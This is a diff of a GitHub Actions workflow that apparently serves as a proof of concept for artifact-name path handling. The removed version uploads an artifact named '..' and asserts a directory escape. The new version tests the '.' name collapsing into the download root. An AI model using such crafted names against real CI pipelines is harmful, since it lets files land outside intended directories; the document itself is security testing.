@@ -1,6 +1,6 @@
-name: actions artifact dotdot validation
+name: actions artifact dot validation
 
-run-name: actions artifact dotdot validation ${{ github.run_id }}
+run-name: actions artifact dot validation ${{ github.run_id }}
 
 on:
   push:
@@ -13,22 +13,22 @@ permissions:
   actions: read
 
 jobs:
-  validate-dotdot-artifact-name:
+  validate-dot-artifact-name:
     runs-on: ubuntu-latest
     steps:
       - name: Prepare payload files
         run: |
           set -euo pipefail
-          rm -rf payload-dotdot payload-safe sandbox
-          mkdir -p payload-dotdot payload-safe sandbox/inner
-          printf 'dotdot-poc-%s\n' "$GITHUB_RUN_ID" > payload-dotdot/poc.txt
+          rm -rf payload-dot payload-safe sandbox
+          mkdir -p payload-dot payload-safe sandbox/inner
+          printf 'dot-poc-%s\n' "$GITHUB_RUN_ID" > payload-dot/poc.txt
           printf 'safe-%s\n' "$GITHUB_RUN_ID" > payload-safe/safe.txt
 
-      - name: Upload crafted dotdot artifact
+      - name: Upload crafted dot artifact
         uses: actions/upload-artifact@v7.0.1
         with:
-          name: ..
-          path: payload-dotdot/poc.txt
+          name: .
+          path: payload-dot/poc.txt
           retention-days: 1
 
       - name: Upload second artifact to force multi-artifact mode
@@ -43,9 +43,14 @@ jobs:
         with:
           path: sandbox/inner
 
-      - name: Validate directory escape
+      - name: Validate per artifact directory collapse
         run: |
           set -euo pipefail
+          echo '--- filesystem result ---'
           find sandbox -maxdepth 4 -type f -print -exec sed -n '1p' {} \;
-          test -f sandbox/poc.txt
+          echo '--- assertions ---'
+          test -f sandbox/inner/poc.txt
           test -f sandbox/inner/safe-artifact/safe.txt
+          if test -f sandbox/inner/./poc.txt; then
+            echo 'dot artifact landed at requested root via path.join(root, ".")'
+          fi
